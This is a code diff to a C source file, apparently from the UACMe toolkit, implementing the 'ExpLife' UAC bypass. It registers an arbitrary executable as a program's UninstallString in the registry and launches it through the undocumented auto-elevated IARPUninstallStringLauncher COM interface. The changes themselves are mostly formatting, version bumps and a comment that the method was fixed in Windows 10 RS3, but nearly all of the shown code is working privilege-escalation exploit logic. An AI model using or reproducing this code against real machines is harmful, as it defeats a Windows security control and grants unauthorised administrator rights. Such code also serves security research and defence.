@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2017
+*  (C) COPYRIGHT AUTHORS, 2016 - 2018
 *
 *  TITLE:       EXPLIFE.C
 *
-*  VERSION:     2.70
+*  VERSION:     2.87
 *
-*  DATE:        01 May 2017
+*  DATE:        19 Jan 2018
 *
 *  ExpLife UAC bypass using IARPUninstallStringLauncher.
 *  For description please visit original URL
@@ -43,12 +43,13 @@ BOOL ucmMasqueradedAPRLaunchFile(
         if (lpszFileGuid == NULL)
             break;
 
-        if (CLSIDFromString(T_CLSID_UninstallStringLauncher, &xCLSID_IARPUninstallStringLauncher) != NOERROR) {
+        if (CLSIDFromString(T_CLSID_UninstallStringLauncher, 
+            &xCLSID_IARPUninstallStringLauncher) != NOERROR)
             break;
-        }
-        if (IIDFromString(T_IID_IARPUninstallStringLauncher, &xIID_IARPUninstallStringLauncher) != S_OK) {
+
+        if (IIDFromString(T_IID_IARPUninstallStringLauncher, 
+            &xIID_IARPUninstallStringLauncher) != S_OK)
             break;
-        }
 
         r = CoCreateInstance(&xCLSID_IARPUninstallStringLauncher, NULL,
             CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
@@ -62,7 +63,8 @@ BOOL ucmMasqueradedAPRLaunchFile(
         if (r != S_OK)
             break;
 
-        r = USLauncher->lpVtbl->LaunchUninstallStringAndWait(USLauncher, 0, lpszFileGuid, FALSE, NULL);
+        r = USLauncher->lpVtbl->LaunchUninstallStringAndWait(USLauncher, 
+            0, lpszFileGuid, FALSE, NULL);
 
     } while (bCond);
 
@@ -79,6 +81,8 @@ BOOL ucmMasqueradedAPRLaunchFile(
 * Purpose:
 *
 * Bypass UAC using AutoElevated undocumented IARPUninstallStringLauncher interface.
+*
+* Fixed in Windows 10 RS3
 *
 */
 BOOL ucmUninstallLauncherMethod(
@@ -100,7 +104,7 @@ BOOL ucmUninstallLauncherMethod(
         if (CoCreateGuid(&guid) != S_OK)
             break;
 
-        _strcpy(szKeyName, L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\");
+        _strcpy(szKeyName, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"));
         if (StringFromGUID2(&guid, szGuid, sizeof(szGuid) / sizeof(WCHAR))) {
             _strcat(szKeyName, szGuid);
 
@@ -111,7 +115,7 @@ BOOL ucmUninstallLauncherMethod(
                 break;
 
             cbData = (1 + _strlen(lpszExecutable)) * sizeof(WCHAR);
-            lResult = RegSetValueEx(hKey, L"UninstallString", 0, REG_SZ, (BYTE*)lpszExecutable,
+            lResult = RegSetValueEx(hKey, TEXT("UninstallString"), 0, REG_SZ, (BYTE*)lpszExecutable,
                 (DWORD)cbData);
 
             if (lResult != ERROR_SUCCESS)
